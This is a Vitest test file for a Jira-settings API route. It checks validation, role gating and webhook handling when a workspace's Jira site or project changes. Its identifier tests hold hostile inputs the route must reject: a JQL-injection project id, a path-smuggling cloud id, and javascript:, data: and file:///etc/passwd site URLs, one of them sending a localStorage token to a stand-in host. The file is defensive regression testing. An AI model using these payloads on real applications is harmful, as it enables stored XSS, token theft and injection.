/**
 * Tests for GET/PATCH /api/account/workspace/jira-settings — the per-workspace
 * Jira push destination stored in task_sync_state.config.
 *
 * Invariants (a sibling of asana-settings, plus the three rules Jira needs and
 * Asana doesn't):
 *  - Any member may READ; only owner/admin may WRITE.
 *  - Each field GROUP travels together (site triple, project triple, issue-type
 *    pair) — a half-written destination is rejected, because the push gate is
 *    the whole cloud/project/type triple and a partial row is silently
 *    un-pushable.
 *  - status_map values must be strings or null, keyed only by the four buckets.
 *  - Unknown keys are rejected rather than silently persisted.
 *  - Read-modify-write: a status-only PATCH keeps the project.
 *  - EXCEPT across a project switch, which resets the status map AND clears the
 *    ISSUE TYPE. Both are project-scoped — statuses belong to that project's
 *    workflow, and a team-managed project owns its own issue-type ids — so
 *    carrying either across produces a destination whose pushes 400.
 *  - …and across a SITE switch, which resets everything below the site,
 *    including the project. Per-site ids that collide across sites (they start
 *    at 10000 everywhere) make a comparison of the project id alone blind
 *    exactly when it matters.
 *  - Every id is FORMAT-checked: they are interpolated into request paths and
 *    into the webhook's JQL filter, where nothing can escape them.
 *  - `site_url` may be explicitly null — Atlassian does not always report one,
 *    and a made-up permalink is worse than none.
 *  - A project can never be stored without a site: the cloudId is the API
 *    ADDRESS, so a site-less project is unreadable, not merely unlabelled.
 *  - `{ project_id: null }` ALONE is an explicit CLEAR — and deliberately KEEPS
 *    the site, unlike Asana's clear, which drops its workspace.
 *  - A project CHANGE (or a first-ever pick) fires tasks/jira-ensure-webhook —
 *    the webhook's JQL filters ONE project. Status-only edits do not.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'

const auth = vi.hoisted(() => ({ result: null as unknown }))
vi.mock('@/lib/api-auth', () => ({
  requireWorkspaceMember: async () => auth.result,
}))

const inngestHoisted = vi.hoisted(() => ({ send: vi.fn(async () => ({ ids: ['e'] })) }))
vi.mock('@/lib/inngest/client', () => ({ inngest: { send: inngestHoisted.send } }))

const hoisted = vi.hoisted(() => ({
  loadJiraSyncState: vi.fn(),
  saveJiraConfig: vi.fn(),
  loadJiraWebhookState: vi.fn(),
  clearJiraWebhookRegistration: vi.fn(),
}))
vi.mock('@/lib/tasks/jira-config', async (importOriginal) => {
  const actual = (await importOriginal()) as Record<string, unknown>
  return {
    ...actual,
    loadJiraSyncState: hoisted.loadJiraSyncState,
    saveJiraConfig: hoisted.saveJiraConfig,
    loadJiraWebhookState: hoisted.loadJiraWebhookState,
    clearJiraWebhookRegistration: hoisted.clearJiraWebhookRegistration,
  }
})

import { GET, PATCH } from '../route'
import type { NextRequest } from 'next/server'

const SAVED_CONFIG = {
  cloud_id: 'cafe0001',
  site_name: 'Acme',
  site_url: 'https://acme.atlassian.net',
  project_id: '10000',
  project_key: 'ENG',
  project_name: 'Engineering',
  issue_type_id: '10001',
  issue_type_name: 'Task',
  status_map: { not_started: '30001', in_progress: null, done: '30003', canceled: null },
}

const SITE = {
  cloud_id: 'cafe0001',
  site_name: 'Acme',
  site_url: 'https://acme.atlassian.net',
}
const PROJECT = { project_id: '20000', project_key: 'GRO', project_name: 'Growth' }
const ISSUE_TYPE = { issue_type_id: '10002', issue_type_name: 'Story' }

function setAuth(role: string) {
  auth.result = { workspaceId: 'ws-1', member: { id: 'm-1', role } }
}

function patchReq(body: unknown): NextRequest {
  return new Request('http://x', {
    method: 'PATCH',
    body: JSON.stringify(body),
  }) as unknown as NextRequest
}

/** The config the route actually persisted. */
function savedConfig(): Record<string, unknown> {
  return hoisted.saveJiraConfig.mock.calls[0][1] as Record<string, unknown>
}

beforeEach(() => {
  vi.clearAllMocks()
  inngestHoisted.send.mockResolvedValue({ ids: ['e'] })
  hoisted.loadJiraSyncState.mockResolvedValue({
    id: 'tss-1',
    accountId: 'acct-1',
    userId: 'u-1',
    config: SAVED_CONFIG,
  })
  hoisted.saveJiraConfig.mockResolvedValue({ error: null })
  hoisted.loadJiraWebhookState.mockResolvedValue({
    id: 'tss-1',
    workspaceId: 'ws-1',
    accountId: 'acct-1',
    userId: 'u-1',
    webhookId: '5000',
    webhookRegisteredAt: '2026-07-01T00:00:00.000Z',
    cloudId: 'cafe0001',
    projectId: '10000',
  })
  hoisted.clearJiraWebhookRegistration.mockResolvedValue({ error: null })
})

// ---- GET -------------------------------------------------------------------

describe('GET /jira-settings', () => {
  it('returns the saved destination for any member', async () => {
    setAuth('member')
    const body = await (await GET()).json()
    expect(body.connected).toBe(true)
    expect(body.accountId).toBe('acct-1')
    expect(body.config).toEqual(SAVED_CONFIG)
  })

  it('NEVER exposes a webhook column to a client', async () => {
    // task_sync_state is SHARED with Asana, whose rows carry a live HMAC key in
    // webhook_secret. JiraSyncState omits every webhook column; this asserts the
    // boundary from the outside, so a "just spread the row" refactor fails here.
    setAuth('owner')
    const body = await (await GET()).json()
    expect(JSON.stringify(body)).not.toContain('webhook')
    expect(Object.keys(body)).toEqual(['connected', 'accountId', 'config'])
  })

  it('reports connected:false with an empty config when Jira is not connected', async () => {
    hoisted.loadJiraSyncState.mockResolvedValue(null)
    setAuth('member')
    const body = await (await GET()).json()
    expect(body).toMatchObject({ connected: false, accountId: null, config: {} })
  })
})

// ---- Role gating -----------------------------------------------------------

describe('PATCH /jira-settings — role gating', () => {
  it.each(['member', 'guest'])('403s a %s and saves nothing', async (role) => {
    setAuth(role)
    const res = await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(res.status).toBe(403)
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it.each(['owner', 'admin'])('lets a %s write', async (role) => {
    setAuth(role)
    const res = await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(res.status).toBe(200)
    expect(hoisted.saveJiraConfig).toHaveBeenCalled()
  })
})

// ---- Validation ------------------------------------------------------------

describe('PATCH /jira-settings — validation', () => {
  beforeEach(() => setAuth('owner'))

  it('rejects an unparseable body', async () => {
    const res = await PATCH(
      new Request('http://x', { method: 'PATCH', body: 'nonsense' }) as unknown as NextRequest,
    )
    expect(res.status).toBe(400)
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('rejects unknown keys rather than silently persisting them', async () => {
    const res = await PATCH(patchReq({ ...PROJECT, board_id: '5' }))
    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('board_id')
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it.each([
    ['site', { cloud_id: 'cafe0002' }],
    ['project', { project_id: '20000' }],
    ['issue type', { issue_type_id: '10002' }],
  ])('rejects a half-written %s group', async (_label, body) => {
    const res = await PATCH(patchReq(body))
    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('together')
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('rejects a blank value inside a group', async () => {
    const res = await PATCH(patchReq({ ...PROJECT, project_name: '   ' }))
    expect(res.status).toBe(400)
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('trims the stored values', async () => {
    await PATCH(patchReq({ ...PROJECT, project_key: '  GRO  ' }))
    expect(savedConfig().project_key).toBe('GRO')
  })

  it('rejects a status_map that is not an object', async () => {
    for (const status_map of ['x', 42, ['a'], null]) {
      hoisted.saveJiraConfig.mockClear()
      const res = await PATCH(patchReq({ status_map }))
      expect(res.status).toBe(400)
      expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
    }
  })

  it('rejects an unknown lifecycle bucket', async () => {
    const res = await PATCH(patchReq({ status_map: { shipped: 's-1' } }))
    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('shipped')
  })

  it('rejects a non-string, non-null status', async () => {
    const res = await PATCH(patchReq({ status_map: { done: 42 } }))
    expect(res.status).toBe(400)
  })

  it('normalizes an absent bucket to null rather than dropping it', async () => {
    await PATCH(patchReq({ status_map: { done: '30003' } }))
    expect(savedConfig().status_map).toEqual({
      not_started: null,
      in_progress: null,
      done: '30003',
      canceled: null,
    })
  })

  it('rejects an empty PATCH', async () => {
    const res = await PATCH(patchReq({}))
    expect(res.status).toBe(400)
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('400s not_connected when the workspace has no Jira row', async () => {
    hoisted.loadJiraSyncState.mockResolvedValue(null)
    const res = await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(res.status).toBe(400)
    expect((await res.json()).code).toBe('not_connected')
  })

  it('500s when the write fails', async () => {
    hoisted.saveJiraConfig.mockResolvedValue({ error: 'db down' })
    const res = await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(res.status).toBe(500)
  })
})

// ---- The site is the API address -------------------------------------------

describe('PATCH /jira-settings — a project needs a site', () => {
  beforeEach(() => setAuth('owner'))

  it('refuses a project when no site is stored or supplied', async () => {
    // Reachable in practice, and letting it through would store a destination
    // the UI reads as configured and every push fails on — there is literally no
    // URL to POST the issue to.
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: {},
    })
    const res = await PATCH(patchReq(PROJECT))

    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('cloud_id')
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('accepts a project when the site arrives in the same PATCH', async () => {
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: {},
    })
    const res = await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(res.status).toBe(200)
    expect(savedConfig()).toMatchObject({ cloud_id: 'cafe0001', project_id: '20000' })
  })
})

// ---- Merge semantics -------------------------------------------------------

describe('PATCH /jira-settings — read-modify-write', () => {
  beforeEach(() => setAuth('owner'))

  it('a status-only PATCH keeps the whole destination', async () => {
    await PATCH(patchReq({ status_map: { done: '30009' } }))
    expect(savedConfig()).toMatchObject({
      cloud_id: 'cafe0001',
      project_id: '10000',
      issue_type_id: '10001',
      status_map: { not_started: null, in_progress: null, done: '30009', canceled: null },
    })
  })

  it('an issue-type-only PATCH keeps the project and the map', async () => {
    await PATCH(patchReq(ISSUE_TYPE))
    expect(savedConfig()).toMatchObject({
      project_id: '10000',
      issue_type_id: '10002',
      issue_type_name: 'Story',
      status_map: SAVED_CONFIG.status_map,
    })
  })

  it('re-saving the SAME project keeps the issue type and the map', async () => {
    await PATCH(
      patchReq({ ...SITE, project_id: '10000', project_key: 'ENG', project_name: 'Engineering' }),
    )
    expect(savedConfig()).toMatchObject({
      issue_type_id: '10001',
      status_map: SAVED_CONFIG.status_map,
    })
  })
})

// ---- The project switch ----------------------------------------------------

describe('PATCH /jira-settings — switching project', () => {
  beforeEach(() => setAuth('owner'))

  it('RESETS the status map — status ids belong to the old project’s workflow', async () => {
    await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(savedConfig().status_map).toEqual({
      not_started: null,
      in_progress: null,
      done: null,
      canceled: null,
    })
  })

  it('CLEARS the issue type — a team-managed project owns its own type ids', async () => {
    // Carrying '10001' onto another project doesn't produce a wrong type, it
    // produces a create that 400s on every push.
    await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(savedConfig()).not.toHaveProperty('issue_type_id')
    expect(savedConfig()).not.toHaveProperty('issue_type_name')
  })

  it('an explicit map in the SAME request wins over the reset', async () => {
    await PATCH(patchReq({ ...SITE, ...PROJECT, status_map: { done: '30010' } }))
    expect(savedConfig().status_map).toMatchObject({ done: '30010' })
  })

  it('an explicit issue type in the SAME request survives the switch', async () => {
    await PATCH(patchReq({ ...SITE, ...PROJECT, ...ISSUE_TYPE }))
    expect(savedConfig()).toMatchObject({ issue_type_id: '10002' })
  })
})

// ---- The SITE switch -------------------------------------------------------

/**
 * REGRESSION (review findings: "changing the Jira site is accepted as a no-op",
 * "a site-only settings PATCH strands a project id from the old Atlassian
 * site", "site switch with a colliding project id keeps the previous site's
 * issue type and status map").
 *
 * The invalidation used to be `patch.project_id !== state.config.project_id` —
 * project id only, never the site. Atlassian mints project, issue-type and
 * status ids per SITE and starts each site's sequence at 10000, so the
 * equivalent project on another tenant routinely compares EQUAL. The stored
 * config then read as fully configured (`isJiraDestinationConfigured` passes,
 * the push menu offers the destination) while addressing site B with site A's
 * ids — every push 400s, or worse, silently lands in an unrelated project that
 * happens to share the id.
 */
describe('PATCH /jira-settings — switching site', () => {
  beforeEach(() => setAuth('owner'))

  const SITE_B = {
    cloud_id: 'cafe0002',
    site_name: 'Acme Sandbox',
    site_url: 'https://acme-sandbox.atlassian.net',
  }

  it('a site-only PATCH drops the project, the issue type and the map', async () => {
    // The shape a curl / the AI+MCP surfaces / an older client can all produce.
    const res = await PATCH(patchReq(SITE_B))
    expect(res.status).toBe(200)

    const config = savedConfig()
    expect(config.cloud_id).toBe('cafe0002')
    for (const key of [
      'project_id',
      'project_key',
      'project_name',
      'issue_type_id',
      'issue_type_name',
    ]) {
      expect(config).not.toHaveProperty(key)
    }
    expect(config.status_map).toEqual({
      not_started: null,
      in_progress: null,
      done: null,
      canceled: null,
    })
  })

  it('clears the issue type and map even when the new project id COLLIDES', async () => {
    // Site B's project also happens to be id 10000 — the case a project-id
    // comparison cannot see, and the most likely one in practice.
    await PATCH(
      patchReq({
        ...SITE_B,
        project_id: '10000',
        project_key: 'MKT',
        project_name: 'Marketing',
      }),
    )

    const config = savedConfig()
    expect(config).toMatchObject({ cloud_id: 'cafe0002', project_id: '10000' })
    expect(config).not.toHaveProperty('issue_type_id')
    expect(config).not.toHaveProperty('issue_type_name')
    expect(config.status_map).toEqual({
      not_started: null,
      in_progress: null,
      done: null,
      canceled: null,
    })
  })

  it('keeps an explicit project + issue type supplied in the SAME request', async () => {
    await PATCH(patchReq({ ...SITE_B, ...PROJECT, ...ISSUE_TYPE }))
    expect(savedConfig()).toMatchObject({
      cloud_id: 'cafe0002',
      project_id: '20000',
      issue_type_id: '10002',
    })
  })

  it('re-points the webhook AND hands the old site’s registration over for retirement', async () => {
    await PATCH(patchReq(SITE_B))

    // The stored id belongs to site A and cannot be deleted through site B, so
    // it is forgotten here (the convergence pass must CREATE, not hunt for it)
    // and passed along with the site it actually lives on.
    expect(hoisted.clearJiraWebhookRegistration).toHaveBeenCalledWith('tss-1')
    expect(inngestHoisted.send).toHaveBeenCalledWith({
      name: 'tasks/jira-ensure-webhook',
      data: {
        syncStateId: 'tss-1',
        retireWebhook: { webhookId: '5000', cloudId: 'cafe0001' },
      },
    })
  })

  it('reads the outgoing registration BEFORE the new site is saved', async () => {
    // Afterwards nothing knows where it lives: the cloudId is gone from config.
    const order: string[] = []
    hoisted.loadJiraWebhookState.mockImplementation(async () => {
      order.push('read-webhook-state')
      return {
        id: 'tss-1',
        workspaceId: 'ws-1',
        accountId: 'acct-1',
        userId: 'u-1',
        webhookId: '5000',
        webhookRegisteredAt: null,
        cloudId: 'cafe0001',
        projectId: '10000',
      }
    })
    hoisted.saveJiraConfig.mockImplementation(async () => {
      order.push('save-config')
      return { error: null }
    })

    await PATCH(patchReq(SITE_B))

    expect(order).toEqual(['read-webhook-state', 'save-config'])
  })

  it('does not touch the registration when the site did NOT move', async () => {
    await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(hoisted.clearJiraWebhookRegistration).not.toHaveBeenCalled()
  })
})

// ---- Identifier formats ----------------------------------------------------

/**
 * REGRESSION (review findings: "project_id is stored unvalidated and
 * interpolated straight into the webhook's JQL filter", "cloudId is
 * interpolated unencoded into the Atlassian gateway URL"). This route is the
 * boundary those values enter through — from the UI, and equally from the
 * AI/MCP surfaces or a curl — and downstream they land in a request PATH and in
 * a JQL string, neither of which offers escaping.
 */
describe('PATCH /jira-settings — identifier validation', () => {
  beforeEach(() => setAuth('owner'))

  it('rejects a cloud_id that is not an Atlassian cloud id', async () => {
    const res = await PATCH(
      patchReq({
        cloud_id: 'cafe0001/rest/api/3/filter/search?x=',
        site_name: 'Acme',
        site_url: 'https://acme.atlassian.net',
      }),
    )
    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('cloud_id')
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('rejects a project_id carrying JQL', async () => {
    const res = await PATCH(
      patchReq({
        project_id: '10000 OR assignee != null',
        project_key: 'ENG',
        project_name: 'Engineering',
      }),
    )
    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('project_id')
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('rejects a non-numeric issue_type_id and status id', async () => {
    expect(
      (await PATCH(patchReq({ issue_type_id: 'Task', issue_type_name: 'Task' }))).status,
    ).toBe(400)
    expect((await PATCH(patchReq({ status_map: { done: 'Done' } }))).status).toBe(400)
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  /**
   * REGRESSION (review finding: "unvalidated jira site_url reaches
   * openExternalUrl/window.open — stored XSS via javascript: scheme").
   *
   * `site_url` was the one member of the site group with no format rule, and it
   * is not decorative: it is the base of `{site_url}/browse/{KEY}`, which is
   * COPIED onto every pushed action's `external_url`, and of the compose panel's
   * native-create deep link. Both are opened with openExternalUrl. An admin who
   * writes a `javascript:` url here therefore plants a payload that runs in
   * every OTHER member's session, in the app's own origin — stored XSS. This is
   * the first of the three layers (PATCH here, parseJiraConfig for rows written
   * before it, open-external for every caller).
   */
  it.each([
    ['javascript:fetch("https://evil.test?t="+localStorage.token)'],
    ['data:text/html,<script>alert(1)</script>'],
    ['file:///etc/passwd'],
    ['JaVaScRiPt:alert(1)'],
    ['acme.atlassian.net'],
  ])('rejects a site_url that is not an absolute http(s) url: %s', async (siteUrl) => {
    const res = await PATCH(
      patchReq({ cloud_id: 'cafe0002', site_name: 'Acme', site_url: siteUrl }),
    )
    expect(res.status).toBe(400)
    expect((await res.json()).error).toContain('site_url')
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })

  it('still accepts an ordinary https site url', async () => {
    const res = await PATCH(
      patchReq({
        cloud_id: 'cafe0002',
        site_name: 'Acme Sandbox',
        site_url: 'https://acme-sandbox.atlassian.net',
      }),
    )
    expect(res.status).toBe(200)
    expect(savedConfig().site_url).toBe('https://acme-sandbox.atlassian.net')
  })
})

// ---- A site with no browsable url ------------------------------------------

/**
 * REGRESSION (review finding: "site_url falls back to the API gateway, storing
 * an unusable /browse permalink on every link"). `accessible-resources`
 * documents `url` as best-effort, and the route's non-empty-string requirement
 * left the client inventing one. That value is copied onto every
 * `action_external_task` row, so it outlives the config it came from: a wrong
 * permalink is permanent, a missing one is merely absent (and issueBrowseUrl
 * already returns null for it).
 */
describe('PATCH /jira-settings — a site that reports no url', () => {
  beforeEach(() => setAuth('owner'))

  it('accepts site_url: null and stores no url at all', async () => {
    const res = await PATCH(
      patchReq({ cloud_id: 'cafe0002', site_name: 'Acme Sandbox', site_url: null }),
    )
    expect(res.status).toBe(200)
    expect(savedConfig().cloud_id).toBe('cafe0002')
    expect(savedConfig()).not.toHaveProperty('site_url')
  })

  it('still requires the rest of the group to travel together', async () => {
    const res = await PATCH(patchReq({ cloud_id: 'cafe0002', site_url: null }))
    expect(res.status).toBe(400)
  })

  it('still rejects an empty STRING — null is the explicit "there is none"', async () => {
    const res = await PATCH(
      patchReq({ cloud_id: 'cafe0002', site_name: 'Acme', site_url: '   ' }),
    )
    expect(res.status).toBe(400)
  })

  it('does not let any OTHER key be nulled', async () => {
    const res = await PATCH(
      patchReq({ cloud_id: 'cafe0002', site_name: null, site_url: 'https://x.atlassian.net' }),
    )
    expect(res.status).toBe(400)
  })
})

// ---- Clearing --------------------------------------------------------------

describe('PATCH /jira-settings — clearing the destination', () => {
  beforeEach(() => setAuth('owner'))

  it('drops the project AND the issue type, and resets the map', async () => {
    const res = await PATCH(patchReq({ project_id: null }))
    expect(res.status).toBe(200)

    const config = savedConfig()
    for (const key of [
      'project_id',
      'project_key',
      'project_name',
      'issue_type_id',
      'issue_type_name',
    ]) {
      expect(config).not.toHaveProperty(key)
    }
    expect(config.status_map).toEqual({
      not_started: null,
      in_progress: null,
      done: null,
      canceled: null,
    })
  })

  it('KEEPS the site — the cloudId is the API address, not the destination', async () => {
    // A deliberate divergence from Asana's clear, which drops its workspace: a
    // site-only config still reads as unconfigured everywhere (the push gate is
    // the full triple), so keeping it is inert and saves re-picking a tenant the
    // user is obviously still connected to.
    await PATCH(patchReq({ project_id: null }))
    expect(savedConfig()).toMatchObject({
      cloud_id: 'cafe0001',
      site_name: 'Acme',
      site_url: 'https://acme.atlassian.net',
    })
  })

  it('rejects a null project_id ALONGSIDE other keys', async () => {
    // Far more likely a bug than an intention, and the two meanings (merge vs.
    // remove) can't be reconciled.
    const res = await PATCH(patchReq({ project_id: null, project_name: 'Growth' }))
    expect(res.status).toBe(400)
    expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
  })
})

// ---- Webhook convergence ---------------------------------------------------

describe('PATCH /jira-settings — webhook convergence', () => {
  beforeEach(() => setAuth('owner'))

  it('fires ensure-webhook when the project CHANGES', async () => {
    await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(inngestHoisted.send).toHaveBeenCalledWith({
      name: 'tasks/jira-ensure-webhook',
      data: { syncStateId: 'tss-1' },
    })
    // Same site, so nothing has to be retired on another tenant.
    expect(hoisted.clearJiraWebhookRegistration).not.toHaveBeenCalled()
  })

  it('fires ensure-webhook on a first-ever pick', async () => {
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: SITE,
    })
    await PATCH(patchReq({ ...SITE, ...PROJECT }))
    expect(inngestHoisted.send).toHaveBeenCalled()
  })

  it('fires ensure-webhook on a CLEAR (the registration has to be torn down)', async () => {
    await PATCH(patchReq({ project_id: null }))
    expect(inngestHoisted.send).toHaveBeenCalled()
  })

  it('does NOT fire for a status-only edit', async () => {
    // The registration filters on the project, which hasn't moved.
    await PATCH(patchReq({ status_map: { done: '30009' } }))
    expect(inngestHoisted.send).not.toHaveBeenCalled()
  })

  it('does NOT fire for an issue-type-only edit', async () => {
    await PATCH(patchReq(ISSUE_TYPE))
    expect(inngestHoisted.send).not.toHaveBeenCalled()
  })

  it('does NOT fire when the project is re-saved unchanged', async () => {
    await PATCH(
      patchReq({ ...SITE, project_id: '10000', project_key: 'ENG', project_name: 'Engineering' }),
    )
    expect(inngestHoisted.send).not.toHaveBeenCalled()
  })

  it('still answers 200 when the dispatch fails (fire-and-forget)', async () => {
    // Registering is an Atlassian round-trip no user should wait on, and the
    // 30-minute cron re-fires the same event as a self-heal.
    inngestHoisted.send.mockRejectedValue(new Error('inngest down'))
    const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

    const res = await PATCH(patchReq({ ...SITE, ...PROJECT }))

    expect(res.status).toBe(200)
    errSpy.mockRestore()
  })
})

// ---- Attribution opt-out ---------------------------------------------------

/**
 * `include_dial8_attribution` gates the bold identifier paragraph + "Pushed
 * from Dial8" provenance paragraph on pushed issues. It is PROVIDER-level, not
 * part of the destination: it arrives alone, and it must survive every reset
 * here — and this route has the most aggressive ones, because a site switch
 * invalidates every id beneath it.
 */
describe('PATCH /jira-settings — include_dial8_attribution', () => {
  beforeEach(() => setAuth('owner'))

  it('accepts the flag ON ITS OWN, keeping the whole destination', async () => {
    const res = await PATCH(patchReq({ include_dial8_attribution: false }))
    expect(res.status).toBe(200)

    const config = savedConfig()
    expect(config.include_dial8_attribution).toBe(false)
    // Read-modify-write: an attribution-only PATCH is not a destination edit.
    expect(config.project_id).toBe('10000')
    expect(config.issue_type_id).toBe('10001')
    expect(config.status_map).toEqual(SAVED_CONFIG.status_map)
  })

  it('accepts true as well as false', async () => {
    await PATCH(patchReq({ include_dial8_attribution: true }))
    expect(savedConfig().include_dial8_attribution).toBe(true)
  })

  it('REJECTS a non-boolean rather than coercing it', async () => {
    // "false" is truthy: coercing it would flip an opt-out into an opt-in.
    for (const value of ['false', 'true', 1, 0, null, {}]) {
      hoisted.saveJiraConfig.mockClear()
      const res = await PATCH(patchReq({ include_dial8_attribution: value }))
      expect(res.status, `value ${JSON.stringify(value)}`).toBe(400)
      expect(await res.json()).toMatchObject({
        error: '`include_dial8_attribution` must be a boolean',
      })
      expect(hoisted.saveJiraConfig).not.toHaveBeenCalled()
    }
  })

  it('SURVIVES a SITE switch, which resets everything beneath it', async () => {
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: { ...SAVED_CONFIG, include_dial8_attribution: false },
    })
    await PATCH(
      patchReq({
        cloud_id: 'cafe0002',
        site_name: 'Acme Sandbox',
        site_url: 'https://acme-sandbox.atlassian.net',
      }),
    )

    const config = savedConfig()
    // The per-site ids are gone (they resolve to strangers on the new tenant)…
    expect(config).not.toHaveProperty('project_id')
    expect(config).not.toHaveProperty('issue_type_id')
    // …but a preference about Dial8's own branding has no such failure mode.
    expect(config.include_dial8_attribution).toBe(false)
  })

  it('SURVIVES a project switch', async () => {
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: { ...SAVED_CONFIG, include_dial8_attribution: false },
    })
    await PATCH(patchReq({ ...SITE, ...PROJECT }))

    const config = savedConfig()
    expect(config.project_id).toBe('20000')
    expect(config.include_dial8_attribution).toBe(false)
  })

  it('SURVIVES an explicit destination clear', async () => {
    // Re-picking a project later must not silently re-brand issues the user
    // opted out of branding.
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: { ...SAVED_CONFIG, include_dial8_attribution: false },
    })
    await PATCH(patchReq({ project_id: null }))

    const config = savedConfig()
    expect(config).not.toHaveProperty('project_id')
    expect(config.include_dial8_attribution).toBe(false)
  })

  it('does NOT fire ensure-webhook — it changes no destination', async () => {
    await PATCH(patchReq({ include_dial8_attribution: false }))
    expect(inngestHoisted.send).not.toHaveBeenCalled()
  })

  it('is returned by GET so the toggle can render its saved state', async () => {
    setAuth('member')
    hoisted.loadJiraSyncState.mockResolvedValue({
      id: 'tss-1',
      accountId: 'acct-1',
      userId: 'u-1',
      config: { ...SAVED_CONFIG, include_dial8_attribution: false },
    })
    const body = await (await GET()).json()
    expect(body.config.include_dial8_attribution).toBe(false)
  })

  it('is ABSENT from a GET for a connection that never set it', async () => {
    // The client reads absent as ON; the server never backfills the key.
    setAuth('member')
    const body = await (await GET()).json()
    expect(body.config).not.toHaveProperty('include_dial8_attribution')
  })
})
